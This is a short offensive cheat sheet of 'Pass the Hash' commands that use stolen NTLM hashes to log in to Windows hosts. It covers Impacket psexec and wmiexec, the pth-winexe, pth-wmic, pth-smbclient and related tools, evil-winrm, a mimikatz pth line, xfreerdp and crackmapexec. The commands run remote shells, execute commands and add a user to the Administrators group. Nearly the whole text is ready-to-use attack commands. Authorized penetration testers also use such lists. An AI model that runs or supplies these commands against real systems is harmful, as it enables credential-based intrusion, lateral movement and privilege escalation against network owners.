## Pass the Hash:  
**Impacket and pth**:  
1) psexec.py -hashes LM:NTLM admin@target  
2) wmiexec.py -hashes :NTLM admin@target  
3) pth-winexe -U admin% //target cmd  
4) pth-wmic -U admin% //target "select Name from Win32_UserAccount"  
5) pth-wmis -U admin% //target "cmd.exe /c whoami > c:\out.txt"
6) pth-smbclient -U admin% //target/c$
7) pth-rpcclient -U admin% //target
8) pth-sqsh -U admin -S target
9) pth-curl http://target/exec?cmd=ipconfig
10) pth-net rpc group ADDMEM 'Administrators' username -S target -U domain/user

**Evil-winrm**:  
evil-winrm -i target -u admin -H "NT hash value"

**Windows (mimikatz)**:  
mimikatz.exe securlsa::pth /user:username /domain:domain /ntlm:NTLM_HASH /run:cmd  

**RDP**:  
xfreerdp /u:<user> /d:domain /pth:hash /v:ipAddr 

**CME**:  
crackmapexec smb <IP> -u username -H ":NT hash value"  

